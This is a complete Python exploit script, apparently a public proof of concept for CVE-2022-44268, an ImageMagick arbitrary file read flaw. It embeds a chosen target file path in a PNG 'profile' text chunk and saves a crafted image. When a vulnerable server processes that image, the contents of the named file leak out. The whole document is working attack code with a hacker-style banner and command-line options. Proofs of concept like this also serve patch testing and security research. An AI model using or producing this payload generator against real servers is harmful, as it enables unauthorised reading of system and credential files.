#!/usr/bin/env python3
import png
import argparse
import os
import time
from PIL import Image, PngImagePlugin


def main():
    print(r'''
     
  ______     __  _____                   ______                
 |  _ \ \   / / |  __ \                 |  ____|               
 | |_) \ \_/ /  | |__) |__   __ _ ______| |__ _ __ ___   __ _  
 |  _ < \   /   |  ___/ _ \ / _` |______|  __| '__/ _ \ / _` | 
 | |_) | | |    | |  | (_) | (_| |      | |  | | | (_) | (_| | 
 |____/  |_|    |_|   \___/ \__, |      |_|  |_|  \___/ \__, | 
                             __/ |                       __/ | 
                            |___/                       |___/  

    ''')
    print("\n   [*] ImageMagick LFI Exploit")
    parser = argparse.ArgumentParser(description='ImageMagick LFI Exploit: PoC for CVE-2022-44268')
    parser.add_argument('-f', '--lfile', help='Target file to read', required=True)
    parser.add_argument('-i', '--input', help='Input image file', required=True)
    parser.add_argument('-o', '--output', help='Output PNG file', required=True)
    args = parser.parse_args()
    time.sleep(0.2)
    print("   [*] Embedding Payload to read the target file")
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", args.lfile)
    im = Image.open(args.input)
    im.save(args.output, "PNG", pnginfo=info)
    time.sleep(0.2)
    print(f"   [*] Exploit PNG generated: {args.output}")



if __name__ == '__main__':
    main()
